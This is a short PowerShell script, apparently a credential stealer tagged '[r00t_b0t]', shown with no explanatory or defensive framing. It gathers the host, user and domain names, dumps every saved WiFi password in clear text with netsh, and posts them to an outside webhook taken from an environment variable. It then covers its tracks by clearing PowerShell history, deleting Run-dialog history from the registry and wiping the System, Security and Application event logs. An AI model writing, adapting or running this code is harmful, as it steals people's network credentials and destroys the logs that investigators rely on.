$wh=$env:WH
$m="[r00t_b0t] Incoming Data"+"`n"
$m=$m+"================================"+"`n"
$m=$m+"PC      : "+$env:COMPUTERNAME+"`n"
$m=$m+"User    : "+$env:USERNAME+"`n"
$m=$m+"Domain  : "+$env:USERDOMAIN+"`n"
$m=$m+"================================"+"`n"
$m=$m+"WiFi Passwords"+"`n"
$m=$m+"--------------------------------"+"`n"
$profiles=netsh wlan show profiles|Select-String "All User Profile"
foreach($line in $profiles){
$n=($line -split ":")[1].Trim()
$key=netsh wlan show profile name=$n key=clear|Select-String "Key Content"
if($key){$m=$m+"Network  : "+$n+"`nPassword : "+($key -split ":")[1].Trim()+"`n--------------------------------`n"}
}
$body=ConvertTo-Json @{content=$m}
Invoke-RestMethod -Uri $wh -Method Post -ContentType "application/json" -Body $body
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
wevtutil cl System 2>$null
wevtutil cl Security 2>$null
wevtutil cl Application 2>$null
